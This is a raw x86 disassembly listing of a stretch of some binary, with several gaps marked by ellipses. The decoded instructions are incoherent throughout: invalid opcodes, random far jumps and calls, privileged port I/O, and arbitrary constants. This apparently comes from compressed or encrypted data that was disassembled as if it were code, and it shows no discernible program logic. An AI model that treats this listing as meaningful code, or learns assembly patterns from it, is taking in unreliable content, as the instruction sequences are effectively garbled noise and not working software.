  41e49d:	or     BYTE PTR ds:0xf778e301,bl
  41e4a3:	pop    edx
  41e4a4:	mov    ah,0xac
  41e4a6:	int3   
  41e4a7:	test   BYTE PTR [ebx-0x11e7a12d],bh
  41e4ad:	loope  0x41e498
  41e4af:	cmc    
  41e4b0:	xor    eax,0xe6822a4d
  41e4b5:	cwde   
  41e4b6:	add    DWORD PTR [ebp-0x47a564d4],esi
  41e4bc:	cmp    BYTE PTR [edi+esi*2-0x2c705f2e],dl
  41e4c3:	jb     0x41e50a
  41e4c5:	scas   al,BYTE PTR es:[edi]
  41e4c6:	add    eax,0x83a66fcb
  41e4cb:	mov    BYTE PTR [esi+0x19],0xac
  41e4cf:	mov    edx,0xd8da2bb3
  41e4d4:	xchg   ebp,eax
  41e4d5:	push   0xffffffe7
  41e4d7:	shl    DWORD PTR [edi],1
  41e4d9:	ret    0x965a
  41e4dc:	push   ds
  41e4dd:	bound  edx,QWORD PTR [esi+0x722f1c16]
  41e4e3:	mov    eax,ds:0xe13e0ee6
  41e4e8:	test   al,0x49
  41e4ea:	mov    ebp,0x6173d158
  41e4ef:	jle    0x41e4b5
  41e4f1:	sti    
  41e4f2:	inc    esi
  41e4f3:	xor    edi,DWORD PTR [edi+0x3ab0a2fe]
  41e4f9:	lea    eax,[edx-0x119c7dd1]
  41e4ff:	frstor [edx-0x36b1e2d6]
  41e505:	or     DWORD PTR [ebx-0x7e9a2794],ecx
  41e50b:	in     eax,0xc6
  41e50d:	cdq    
  41e50e:	sti    
  41e50f:	cli    
  41e510:	mov    BYTE PTR [edi],0x3b
  41e513:	imul   ebx,DWORD PTR [ebx+ebp*8],0xffffff92
  41e517:	imul   ebp,DWORD PTR [edx+eax*8+0x16],0x8cfb371d
  41e51f:	(bad)  
  41e520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e521:	push   edx
  41e522:	mov    dh,0xb
  41e524:	pop    ss
  41e525:	fiadd  DWORD PTR [ebp-0x2d2139a1]
  41e52b:	fisttp QWORD PTR [esp+edx*8]
  41e52e:	cmc    
  41e52f:	adc    eax,0xcfd5c321
  41e534:	push   ebp
  41e535:	idiv   ebp
  41e537:	ror    DWORD PTR [eax],cl
  41e539:	ds jae 0x41e591
  41e53c:	add    WORD PTR [edx+0x34],dx
  41e540:	je     0x41e529
  41e542:	imul   eax,DWORD PTR [ebp+0x46],0xfffffff1
  41e546:	jle    0x41e566
  41e548:	pop    DWORD PTR [ecx+0x53]
  41e54b:	or     ah,BYTE PTR [ebx+0x5d]
  41e54e:	ds cli 
  41e550:	adc    BYTE PTR [esi],bl
  41e552:	dec    ecx
  41e553:	adc    eax,0x696bfe5b
  41e558:	xchg   ecx,eax
  41e559:	fst    st(3)
  41e55b:	shl    BYTE PTR [ecx-0x43],0x8b
  41e55f:	lods   al,BYTE PTR ds:[esi]
  41e560:	js     0x41e52d
  41e562:	mov    bh,0x1
  41e564:	and    BYTE PTR [esi+eax*1],0x8b
  41e568:	lods   al,BYTE PTR ds:[esi]
  41e569:	and    eax,0xb811955b
	...
  41e5d6:	and    BYTE PTR [edx-0x35],ch
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e582
  41e5e3:	jo     0x41e593
  41e5e5:	outs   dx,DWORD PTR ds:[esi]
  41e5e6:	addr16 inc esi
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	add    BYTE PTR [ecx],al
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	arpl   WORD PTR [ecx+0x76],bx
  41e5f1:	ss adc eax,edx
  41e5f4:	lock cld 
  41e5f6:	jmp    0x41e5e4
  41e5f8:	inc    ebx
  41e5f9:	call   0xa8c9:0xab15712b
  41e600:	push   eax
  41e601:	shr    DWORD PTR [esi],1
  41e603:	lods   al,BYTE PTR ds:[esi]
  41e604:	iret   
  41e605:	jl     0x41e633
  41e607:	push   esi
  41e608:	push   edi
  41e609:	sbb    cl,0x46
  41e60c:	scas   al,BYTE PTR es:[edi]
  41e60d:	stos   DWORD PTR es:[edi],eax
  41e60e:	int    0x7b
  41e610:	ins    DWORD PTR es:[edi],dx
  41e611:	sub    eax,0xe585d690
  41e616:	xor    edx,edi
  41e618:	pop    ebp
  41e619:	imul   eax,esi,0x9d7edaf8
  41e61f:	repnz loopne 0x41e659
  41e622:	call   0x94f1:0xc3c47fb5
  41e629:	and    al,0x6a
  41e62b:	xor    DWORD PTR [ebx],0x48eb8fa4
  41e631:	das    
  41e632:	out    dx,al
  41e633:	pop    ss
  41e634:	addr16 jae 0x41e6a9
  41e637:	pusha  
  41e638:	mov    ebp,eax
  41e63a:	fadd   QWORD PTR [esp+ebp*1+0x679251c1]
  41e641:	pop    es
  41e642:	mov    eax,0xaec9b656
  41e647:	dec    ebx
  41e648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e649:	sub    BYTE PTR [edx+0x24c5a804],0x39
  41e650:	add    BYTE PTR [ecx-0x182abb26],dl
  41e656:	jmp    0x6b5d:0xacda3b58
  41e65d:	sub    edi,DWORD PTR [ebp+0x30]
  41e660:	push   0x48d522b
  41e665:	push   ebx
  41e666:	sahf   
  41e667:	sbb    cl,BYTE PTR ds:0xc1a8e339
  41e66d:	mov    ebp,0x315a822f
  41e672:	xchg   edx,eax
  41e673:	adc    al,0xe2
  41e675:	imul   esp
  41e677:	pop    ecx
  41e678:	push   DWORD PTR [ebp+0x7c]
  41e67b:	fcom   QWORD PTR [edx+0x6c]
  41e67e:	div    DWORD PTR [ecx+0x7782352a]
  41e684:	mov    ch,0x22
  41e686:	je     0x41e69c
  41e688:	imul   ebp,DWORD PTR ds:0xaefe50aa,0x5b
  41e68f:	xchg   ecx,eax
  41e690:	pop    esi
  41e691:	scas   eax,DWORD PTR es:[edi]
  41e692:	outs   dx,DWORD PTR ds:[esi]
  41e693:	neg    bl
  41e695:	call   0x99b3:0x7c5edcd5
  41e69c:	adc    DWORD PTR [edx],edx
  41e69e:	das    
  41e69f:	xor    eax,0x5edd9055
  41e6a4:	adc    al,0x14
  41e6a6:	jae    0x41e6ff
  41e6a8:	ds xchg edi,eax
  41e6aa:	loopne 0x41e6a5
  41e6ac:	jne    0x41e680
  41e6ae:	jmp    0x41e6d2
  41e6b0:	push   es
  41e6b1:	lock retf 0x8825
  41e6b5:	into   
  41e6b6:	jns    0x41e649
  41e6b8:	ss cmp al,0xed
  41e6bb:	ja     0x41e682
  41e6bd:	and    al,0x3d
  41e6bf:	inc    edx
  41e6c0:	mov    al,ds:0x3de0ce85
  41e6c5:	inc    ebp
  41e6c6:	dec    ecx
  41e6c7:	push   cs
  41e6c8:	dec    ecx
  41e6c9:	cmp    edx,DWORD PTR [esi+0x35]
  41e6cc:	xchg   edi,eax
  41e6cd:	add    al,0x2b
  41e6cf:	mov    ch,BYTE PTR [edi+0x11]
  41e6d2:	in     eax,0x3b
  41e6d4:	sub    eax,edx
  41e6d6:	dec    ecx
  41e6d7:	loop   0x41e698
  41e6d9:	sahf   
  41e6da:	push   ecx
  41e6db:	mov    ebp,0x3702b2a
  41e6e0:	dec    eax
  41e6e1:	ins    DWORD PTR es:[edi],dx
  41e6e2:	mov    al,ds:0x3f214434
  41e6e7:	(bad)  ds:[edi]
  41e6ea:	pop    eax
  41e6eb:	hlt    
  41e6ec:	repnz pop eax
	...
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    esi,DWORD PTR [eax]
  41e763:	leave  
  41e764:	aad    0x7f
  41e766:	addr16 inc edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	mov    bh,0x76
  41e770:	xchg   ebp,eax
  41e771:	int    0x6
  41e773:	and    al,BYTE PTR [ecx-0x6e38d99e]
  41e779:	cmp    DWORD PTR [edi+0x6e],0xe94efcbb
  41e780:	popa   
  41e781:	and    eax,0xad8811ea
  41e786:	cdq    
  41e787:	cs call 0xcf7b:0x5b76ea9a
  41e78f:	dec    ebx
  41e790:	sti    
  41e791:	mov    ds:0xe19ed0c1,al
  41e796:	or     DWORD PTR [esp+eax*8+0x7e],edi
  41e79a:	sti    
  41e79b:	imul   edi,DWORD PTR [edx+0xa],0xaed1226d
  41e7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7a3:	pop    ecx
  41e7a4:	les    esi,FWORD PTR [edi+0x6e726732]
  41e7aa:	test   DWORD PTR [eax+0x21],0xc9cf7303
  41e7b1:	inc    esp
  41e7b2:	inc    esp
  41e7b3:	stos   DWORD PTR es:[edi],eax
  41e7b4:	inc    edx
  41e7b5:	mov    edi,0x96d28c2
  41e7ba:	loope  0x41e812
  41e7bc:	sub    al,0xc4
  41e7be:	dec    esi
  41e7bf:	add    eax,DWORD PTR [ebx]
  41e7c1:	ror    DWORD PTR [ebp-0x42150e75],0x45
  41e7c8:	jp     0x41e796
  41e7ca:	shr    DWORD PTR [edx-0x430fd2fb],0x89
  41e7d1:	test   BYTE PTR [edi],dl
  41e7d3:	xor    DWORD PTR [ebp+0x34d43b3d],esi
  41e7d9:	ds dec esi
  41e7db:	and    BYTE PTR [edi+0x79319913],0x57
  41e7e2:	leave  
  41e7e3:	jnp    0x41e7de
  41e7e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7e6:	cmp    DWORD PTR [esi],ecx
  41e7e8:	dec    edx
  41e7e9:	mov    cl,0x91
  41e7eb:	data16 sub BYTE PTR [ebp-0x10],al
  41e7ef:	push   ecx
  41e7f0:	xor    eax,0x3f40bc42
  41e7f5:	out    0xd6,al
  41e7f7:	jge    0x41e857
  41e7f9:	cmp    esi,DWORD PTR [esi+0x7fa849c4]
  41e7ff:	adc    DWORD PTR [ebx-0x1513deac],edi
  41e805:	push   0x8224ee14
  41e80a:	cld    
  41e80b:	jbe    0x41e7c9
  41e80d:	ret    
  41e80e:	hlt    
  41e80f:	(bad)  
  41e810:	and    eax,0xc170ad0c
  41e815:	xchg   edi,eax
  41e816:	xchg   edi,eax
  41e817:	imul   ebx,DWORD PTR [eax],0xfffffffe
  41e81a:	xchg   BYTE PTR es:[edx-0x40],ah
  41e81e:	ins    BYTE PTR es:[edi],dx
  41e81f:	mov    ?,WORD PTR [eax+0x1a3b7741]
  41e825:	shr    BYTE PTR [ebx+0x405af4cf],0xd8
  41e82c:	data16 sbb al,0xf7
  41e82f:	and    DWORD PTR [ebx+0x7d],0xca5a3c2a
  41e836:	and    DWORD PTR [ecx],eax
  41e838:	or     eax,0x138d8474
  41e83d:	push   ecx
  41e83e:	and    cl,bl
  41e840:	adc    al,0x37
  41e842:	xchg   ebx,eax
  41e843:	xchg   edx,eax
  41e844:	(bad)  
  41e845:	inc    ecx
  41e846:	mov    bl,0xa
  41e848:	leave  
  41e849:	inc    ecx
  41e84a:	inc    edx
  41e84b:	int    0x6e
  41e84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e84e:	out    0x78,eax
  41e850:	mov    bl,0xac
  41e852:	and    BYTE PTR [esi],0x15
  41e855:	clc    
  41e856:	mov    ebx,DWORD PTR [ecx-0xe]
  41e859:	lock pop ecx
  41e85b:	mov    ah,dl
  41e85d:	xchg   ecx,eax
  41e85e:	jae    0x41e84b
  41e860:	jmp    0xe60f448
  41e865:	xor    BYTE PTR [esi-0x77],ch
  41e868:	push   esi
  41e869:	test   al,0x7e
  41e86b:	add    DWORD PTR [ecx-0x79],0x0
	...
  41e8d3:	add    BYTE PTR [eax],al
  41e8d5:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e870
  41e8e3:	retf   
  41e8e4:	push   ecx
  41e8e5:	adc    eax,0x14867
  41e8ea:	add    BYTE PTR [ecx],al
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	sub    eax,0xe7fd770f
  41e8f3:	mov    ecx,0xb3166268
  41e8f8:	sub    ah,BYTE PTR [eax]
  41e8fa:	push   0x4d
  41e8fc:	imul   DWORD PTR [ecx+0x3874a39b]
  41e902:	pusha  
  41e903:	scas   eax,DWORD PTR es:[edi]
  41e904:	adc    ah,0x36
  41e907:	lock mov cl,0x64
  41e90a:	inc    edx
  41e90b:	in     al,0x78
  41e90d:	pop    ebx
  41e90e:	push   ecx
  41e90f:	add    DWORD PTR [ecx+0x701a61d1],ebp
  41e915:	in     al,dx
  41e916:	addr16 (bad) 
  41e918:	lods   al,BYTE PTR cs:[esi]
  41e91a:	mov    cl,0x79
  41e91c:	xor    cl,bh
  41e91e:	(bad)  
  41e91f:	jl     0x41e8c9
  41e921:	int    0x51
  41e923:	cld    
  41e924:	mov    edx,0xe836f3ae
  41e929:	pop    ds
  41e92a:	jle    0x41e911
  41e92c:	je     0x41e94c
  41e92e:	cmp    ebx,DWORD PTR [eax-0x33]
  41e931:	retf   0x59a0
  41e934:	shr    DWORD PTR [ebx-0x70],1
  41e937:	test   BYTE PTR [ecx+0x39],ah
  41e93a:	xrelease mov DWORD PTR [ebx+0x6e],edx
  41e93e:	pop    ds
  41e93f:	xchg   esi,eax
  41e940:	xchg   edi,eax
  41e941:	and    ah,BYTE PTR [eax]
  41e943:	mov    DWORD PTR [edx-0x3fb7a27b],ecx
  41e949:	(bad)  
  41e94a:	not    DWORD PTR [edi-0x57]
  41e94d:	push   ebx
  41e94e:	into   
  41e94f:	cdq    
  41e950:	xor    DWORD PTR [eax],esi
  41e952:	loop   0x41e991
  41e954:	add    dl,BYTE PTR [ebp-0xe5a3bb2]
  41e95a:	dec    edi
  41e95b:	jns    0x41e9b0
  41e95d:	or     al,0x19
  41e95f:	dec    ebx
  41e960:	out    dx,eax
  41e961:	xor    ch,bh
  41e963:	pop    es
  41e964:	fcom   QWORD PTR [ecx+0x10cfc915]
  41e96a:	bound  edx,QWORD PTR [edx+0x5c3e4cf7]
  41e970:	mov    eax,0x2cff3a2f
  41e975:	push   bp
  41e977:	fwait
  41e978:	pop    ebx
  41e979:	mov    bl,0xac
  41e97b:	mov    bl,dh
  41e97d:	imul   DWORD PTR [ecx+0x6f98604c]
  41e983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e984:	or     DWORD PTR [esi-0x6d],edi
  41e987:	jne    0x41e97f
  41e989:	jno    0x41e953
  41e98b:	inc    esi
  41e98c:	test   eax,0xe634e85b
  41e991:	in     eax,dx
  41e992:	fld    st(7)
  41e994:	push   ss
  41e995:	aas    
  41e996:	add    bh,BYTE PTR ds:0x78d24042
  41e99c:	mov    eax,ds:0x771d5763
  41e9a1:	lea    esi,[esp+edi*4+0x32]
  41e9a5:	cdq    
  41e9a6:	loopne 0x41e97a
  41e9a8:	or     eax,0xca5dc4e6
  41e9ad:	push   esp
  41e9ae:	or     dh,bl
  41e9b0:	mov    eax,ds:0x2ac756f0
  41e9b5:	pop    DWORD PTR [ecx+0x3c9958bc]
  41e9bb:	xor    al,0x79
  41e9bd:	outs   dx,BYTE PTR ds:[esi]
  41e9be:	dec    esp
  41e9bf:	push   esp
  41e9c0:	push   0x4b682cbf
  41e9c5:	mov    ecx,0x5a373647
  41e9ca:	jne    0x41ea2e
  41e9cc:	(bad)  
  41e9cd:	push   0x2b2ae6a
  41e9d2:	call   0xf8683e94
  41e9d7:	push   esp
  41e9d8:	ins    BYTE PTR es:[edi],dx
  41e9d9:	xor    al,0xc8
  41e9db:	mov    DWORD PTR [ebp+0x2b38ad0a],esp
  41e9e1:	and    ecx,ebx
  41e9e3:	mov    BYTE PTR [esi+0x6c],bl
  41e9e6:	mov    dl,0x93
  41e9e8:	outs   dx,BYTE PTR ds:[esi]
  41e9e9:	cli    
  41e9ea:	in     eax,dx
  41e9eb:	in     al,dx
  41e9ec:	mov    bh,0x36
	...
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea64:	adc    ah,BYTE PTR [edx+0x14967]
  41ea6a:	add    BYTE PTR [ecx],al
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	popf   
  41ea6f:	sbb    ch,ah
  41ea71:	jmp    0x41ea34
  41ea73:	clc    
  41ea74:	popa   
  41ea75:	inc    edx
  41ea76:	cmp    DWORD PTR [ebp+0x359c8def],0xcbef8b65
  41ea80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea81:	cmp    esp,DWORD PTR [edi]
  41ea83:	push   esp
  41ea84:	popa   
  41ea85:	ins    DWORD PTR es:[edi],dx
  41ea86:	xchg   esp,eax
  41ea87:	jmp    0xb066:0xb1e43f1e
  41ea8e:	pushf  
  41ea8f:	test   ah,bl
  41ea91:	pop    es
  41ea92:	out    dx,eax
  41ea93:	jl     0x41eac0
  41ea95:	and    cl,BYTE PTR [ebx]
  41ea97:	jnp    0x41ea97
  41ea99:	ss das 
  41ea9b:	sub    edx,edi
  41ea9d:	dec    ebp
  41ea9e:	and    al,dl
  41eaa0:	daa    
  41eaa1:	push   ebx
  41eaa2:	inc    esp
  41eaa3:	div    BYTE PTR [ecx+edi*1+0x7a2ad4dd]
  41eaaa:	lock jmp 0xd4912768
  41eab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eab1:	inc    esi
  41eab2:	sti    
  41eab3:	cmp    al,0x7b
  41eab5:	inc    esp
  41eab6:	and    esp,eax
  41eab8:	(bad)  
  41eaba:	shl    BYTE PTR [ecx+0x6],1
  41eabd:	repz pop esp
  41eabf:	cmp    ebp,DWORD PTR [eax+0x7b]
  41eac2:	psrad  mm6,QWORD PTR [ebp+0x75]
  41eac6:	ins    DWORD PTR es:[edi],dx
  41eac7:	add    eax,0x1534fafd
  41eacc:	nop
  41eacd:	fstp   DWORD PTR [esi-0x64]
  41ead0:	add    al,0x56
  41ead2:	and    eax,0x5239c580
  41ead7:	cli    
  41ead8:	jl     0x41eaf9
  41eada:	repz mov ch,0x40
  41eadd:	lea    esi,[ebx+0x74]
  41eae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eae1:	pop    edi
  41eae2:	add    edi,ebp
  41eae4:	(bad)  
  41eae5:	push   cs
  41eae6:	repnz (bad) 
  41eae8:	pop    ss
  41eae9:	add    eax,0x5075cb21
  41eaee:	inc    edx
  41eaef:	jg     0x41eb64
  41eaf1:	add    BYTE PTR [ecx],bl
  41eaf3:	hlt    
  41eaf4:	xor    DWORD PTR [ecx],ebp
  41eaf6:	mov    DWORD PTR [ebx+eiz*4],ecx
  41eaf9:	inc    esp
  41eafa:	mov    ds:0x962dff8a,al
  41eaff:	xor    BYTE PTR [edx-0x775b3aa1],bl
  41eb05:	sbb    ecx,DWORD PTR [ebx]
  41eb07:	into   
  41eb08:	push   ds
  41eb09:	lock cmc 
  41eb0b:	sub    ebx,DWORD PTR [edi+0x7546c30]
  41eb11:	sbb    al,0x85
  41eb13:	mov    esp,0xeff9139f
  41eb18:	xchg   BYTE PTR cs:[eax],dh
  41eb1b:	outs   dx,BYTE PTR ds:[esi]
  41eb1c:	jb     0x41eac1
  41eb1e:	inc    edx
  41eb1f:	sub    ecx,eax
  41eb21:	add    eax,0xfb1671f7
  41eb26:	push   ebp
  41eb27:	rcr    BYTE PTR [edi+0x4c],cl
  41eb2a:	rcl    ebx,1
  41eb2c:	arpl   WORD PTR [eax],di
  41eb2e:	add    al,0x44
  41eb30:	cmp    cl,BYTE PTR [ecx]
  41eb32:	in     al,0x6a
  41eb34:	icebp  
  41eb35:	sub    al,0x40
  41eb37:	xor    al,0x43
  41eb39:	clc    
  41eb3a:	adc    DWORD PTR [ebp+0x3f08646],esp
  41eb40:	fdiv   DWORD PTR [ebp+0x3c]
  41eb43:	clc    
  41eb44:	cmp    DWORD PTR [ebp+esi*4+0x9],edx
  41eb48:	ins    DWORD PTR es:[edi],dx
  41eb49:	push   esi
  41eb4a:	lods   eax,DWORD PTR ds:[esi]
  41eb4b:	cmp    bl,BYTE PTR [ecx-0x80]
  41eb4e:	aas    
  41eb4f:	mov    al,0xde
  41eb51:	ins    BYTE PTR es:[edi],dx
  41eb52:	repnz icebp 
  41eb54:	test   DWORD PTR [esi-0x5180e5b7],0xdfce6c60
  41eb5e:	dec    ecx
  41eb5f:	jbe    0x41eb0e
  41eb61:	push   esi
  41eb62:	aaa    
  41eb63:	outs   dx,DWORD PTR ds:[esi]
  41eb64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb65:	mov    ecx,0xda91281b
  41eb6a:	fadd   QWORD PTR [esp+esi*4+0x78]
	...
  41ebd5:	add    BYTE PTR [edx],dl
  41ebd7:	das    
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0xc7
  41ebe3:	mov    esi,0x4a6779b7
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	add    BYTE PTR [ecx],al
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	xor    eax,0xc81c8180
  41ebf3:	test   edx,eax
  41ebf5:	mov    BYTE PTR [ebx-0x11],cl
  41ebf8:	fsub   st(7),st
  41ebfa:	and    BYTE PTR ds:0x14e94461,cl
  41ec00:	jmp    0x41ebf1
  41ec02:	inc    edx
  41ec03:	jno    0x41eb9b
  41ec05:	dec    bl
  41ec07:	mov    ecx,0xcbd77819
  41ec0c:	inc    eax
  41ec0d:	add    ch,al
  41ec0f:	ret    0x39b2
  41ec12:	adc    al,0xb9
  41ec14:	clc    
  41ec15:	repnz retf 0x8a20
  41ec19:	cli    
  41ec1a:	loope  0x41ec52
  41ec1c:	add    al,0x52
  41ec1e:	call   0x5e4b7d6f
  41ec23:	(bad)  
  41ec24:	pop    ss
  41ec25:	pushf  
  41ec26:	and    esp,DWORD PTR [esi+0x73]
  41ec29:	mov    ecx,0x5c5838e8
  41ec2e:	cwde   
  41ec2f:	sbb    ebp,DWORD PTR [edx-0x77fde944]
  41ec35:	call   0x2cf3:0x86ea9e96
  41ec3c:	cmp    cl,BYTE PTR [eax+eiz*1]
  41ec3f:	repz xor al,dh
  41ec42:	test   bl,cl
  41ec44:	push   esi
  41ec45:	pop    esp
  41ec46:	(bad)  
  41ec47:	sub    eax,0xe2997065
  41ec4c:	mov    ah,0x64
  41ec4e:	cmp    BYTE PTR [ebp+0x67],bh
  41ec51:	popa   
  41ec52:	scas   eax,DWORD PTR es:[edi]
  41ec53:	xor    BYTE PTR [ecx-0x51],cl
  41ec56:	mov    bh,0x23
  41ec58:	das    
  41ec59:	mov    ds:0x64edd0c7,al
  41ec5e:	inc    ebp
  41ec5f:	dec    ebx
  41ec60:	xchg   BYTE PTR [edx+0x16d2fd84],dl
  41ec66:	fcom   QWORD PTR ds:0x877a7fe4
  41ec6c:	fxch   st(1)
  41ec6e:	int    0xc8
  41ec70:	stos   BYTE PTR es:[edi],al
  41ec71:	sbb    BYTE PTR [esi+0x5cb2e18e],ah
  41ec77:	in     eax,0x10
  41ec79:	xlat   BYTE PTR ds:[ebx]
  41ec7a:	or     eax,0xff12d94d
  41ec7f:	pop    ebp
  41ec80:	mov    ds:0x4d8183f8,al
  41ec85:	ror    BYTE PTR [esi-0x429186b3],cl
  41ec8b:	(bad)  [edx+0x1d81be2c]
  41ec91:	add    eax,0xca3c985b
  41ec96:	add    al,0xf2
  41ec98:	dec    edx
  41ec99:	pop    ecx
  41ec9a:	add    DWORD PTR [eax],esi
  41ec9c:	pushf  
  41ec9d:	fld    TBYTE PTR [ecx]
  41ec9f:	inc    ecx
  41eca0:	and    bl,BYTE PTR [esi-0x4f]
  41eca3:	lods   al,BYTE PTR ds:[esi]
  41eca4:	ds iret 
  41eca6:	loope  0x41ec72
  41eca8:	int    0xbe
  41ecaa:	je     0x41ec3b
  41ecac:	ds cwde 
  41ecae:	cmp    DWORD PTR [eax-0x36ee9e5],ecx
  41ecb4:	rep stos BYTE PTR es:[edi],al
  41ecb6:	pop    esi
  41ecb7:	ror    DWORD PTR [edx+0x48],0x2c
  41ecbb:	mov    BYTE PTR [ebx],cl
  41ecbd:	(bad)  
  41ecbe:	fdivr  DWORD PTR [ebp+0x64]
  41ecc1:	mov    ah,0xe1
  41ecc3:	inc    edi
  41ecc4:	add    al,BYTE PTR [esi-0x33]
  41ecc7:	mov    bl,0xb8
  41ecc9:	push   ecx
  41ecca:	mov    ah,0xdb
  41eccc:	lds    esp,FWORD PTR fs:[ebx]
  41eccf:	std    
  41ecd0:	in     eax,dx
  41ecd1:	pop    ss
  41ecd2:	data16 das 
  41ecd4:	xchg   DWORD PTR [edi+0x31],ebx
  41ecd7:	inc    esp
  41ecd8:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecda:	imul   cl
  41ecdc:	jle    0x41ecfa
  41ecde:	push   0x185d5bd
  41ece3:	push   ss
  41ece4:	(bad)  
  41ece5:	adc    eax,0x726c8b6e
  41ecea:	pop    esi
  41eceb:	rol    DWORD PTR [ebx],0xd0
	...
  41ed56:	inc    ecx
  41ed57:	icebp  
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xd9045fd0
  41ed64:	sub    al,0x69
  41ed66:	addr16 dec ebx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	add    BYTE PTR [ecx],al
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	in     al,0xb8
  41ed70:	cdq    
  41ed71:	into   
  41ed72:	dec    edx
  41ed73:	scas   eax,DWORD PTR es:[edi]
  41ed74:	les    eax,FWORD PTR [edi+0x3a4d5fec]
  41ed7a:	je     0x41edf7
  41ed7c:	add    al,0x91
  41ed7e:	call   0xdd55:0x3cb68a00
  41ed85:	aaa    
  41ed86:	add    DWORD PTR [ecx+0x79],ecx
  41ed89:	rcr    DWORD PTR [ecx],0x58
  41ed8c:	sub    BYTE PTR [esi],ah
  41ed8e:	imul   eax,ecx,0xb7ad07ca
  41ed94:	push   edx
  41ed95:	mov    eax,DWORD PTR [esi-0x56fc63f5]
  41ed9b:	push   esi
  41ed9c:	imul   eax,esi,0x5b
  41ed9f:	xor    eax,0x1491789b
  41eda4:	iret   
  41eda5:	jl     0x41edaa
  41eda7:	bound  edi,QWORD PTR [edx]
  41eda9:	push   ecx
  41edaa:	add    al,ah
  41edac:	xchg   ecx,eax
  41edad:	pop    ds
  41edae:	shl    DWORD PTR [eax],1
  41edb0:	(bad)  
  41edb1:	mov    cl,0x37
  41edb3:	sub    ebx,esp
  41edb5:	mov    ch,0x65
  41edb7:	lods   eax,DWORD PTR ds:[esi]
  41edb8:	rep outs dx,DWORD PTR ds:[esi]
  41edba:	mov    esp,0x3ebd06a
  41edbf:	adc    BYTE PTR [eax-0x3c],ch
  41edc2:	aas    
  41edc3:	imul   edx,DWORD PTR [ebx-0x3e],0xffffff91
  41edc7:	xor    ebp,ecx
  41edc9:	add    BYTE PTR [edi-0x1ba4f3c1],dh
  41edcf:	push   es
  41edd0:	push   es
  41edd1:	cmp    bh,dl
  41edd3:	mov    esp,0x5066de12
  41edd8:	mov    edi,0xa76711cf
  41eddd:	repnz ror BYTE PTR [esi],0xc2
  41ede1:	js     0x41ee1b
  41ede3:	sbb    DWORD PTR ds:0x13f10c7,eax
  41ede9:	cdq    
  41edea:	retf   0x577a
  41eded:	ins    DWORD PTR es:[edi],dx
  41edee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edef:	mov    esi,0xd5897852
  41edf4:	add    ecx,esp
  41edf6:	jl     0x41ed90
  41edf8:	lahf   
  41edf9:	(bad)  [ebp+ebx*2+0x273f953a]
  41ee00:	jle    0x41ee4c
  41ee02:	sti    
  41ee03:	ds fadd st(0),st
  41ee06:	(bad)  
  41ee07:	jmp    0x41ee74
  41ee09:	xchg   edx,eax
  41ee0a:	in     eax,0x43
  41ee0c:	jecxz  0x41ee4b
  41ee0e:	jl     0x41ee09
  41ee10:	inc    edi
  41ee11:	pop    ebx
  41ee12:	adc    eax,0x5cc75de9
  41ee17:	pop    esi
  41ee18:	xor    ebx,DWORD PTR [edi]
  41ee1a:	ss xor al,0x73
  41ee1d:	fisttp DWORD PTR [edi]
  41ee1f:	mov    bl,0x9c
  41ee21:	jae    0x41edcb
  41ee23:	mov    bh,0xc4
  41ee25:	xchg   ebx,eax
  41ee26:	xchg   BYTE PTR [edi+0x59],bl
  41ee29:	fisub  WORD PTR [bx+si]
  41ee2c:	pushf  
  41ee2d:	lods   eax,DWORD PTR ds:[esi]
  41ee2e:	sub    eax,0x873ed21
  41ee33:	sbb    eax,0x67be14d5
  41ee38:	enter  0xbca3,0x8b
  41ee3c:	rcl    BYTE PTR [edx+edi*8],1
  41ee3f:	adc    ah,ah
  41ee41:	pop    ecx
  41ee42:	clc    
  41ee43:	pop    esi
  41ee44:	sbb    al,0x90
  41ee46:	lds    ebp,FWORD PTR [ecx+0x9f3b186]
  41ee4c:	or     DWORD PTR [edx],ecx
  41ee4e:	mov    ds:0x357c2610,eax
  41ee53:	sbb    edi,DWORD PTR [esp+ebp*8]
  41ee56:	nop
  41ee57:	ds inc eax
  41ee59:	and    al,0x9b
